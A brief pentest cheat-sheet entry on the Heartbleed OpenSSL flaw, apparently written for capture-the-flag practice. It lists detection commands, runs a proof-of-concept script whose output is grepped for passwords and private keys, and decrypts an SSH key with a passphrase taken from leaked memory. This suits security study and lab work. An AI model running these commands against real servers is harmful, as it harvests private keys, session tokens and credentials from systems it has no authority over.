# Heartbleed OpenSSL Memory Leak (CVE-2014-0160)

Heartbleed leaks ~64KB of server memory per request — run multiple times to collect enough data.

**Detect:**
```bash
nmap -p 443 --script ssl-heartbleed <TARGET>
sslscan <TARGET>:443 | grep -i heartbleed
```

**Exploit (Python PoC or searchsploit):**
```bash
searchsploit heartbleed
python heartbleed.py <TARGET> -p 443 | strings | grep -E '(pass|user|key|BEGIN)'
```

Leaked data may include:
- Private key material
- Session cookies / tokens
- Plaintext credentials submitted via POST

**If encrypted SSH key is found**, try decrypting with leaked data as passphrase:
```bash
openssl rsa -in hype_key_encrypted -out hype_key_decrypted
# enter passphrase from leaked memory
```

Patch: OpenSSL ≥ 1.0.1g.
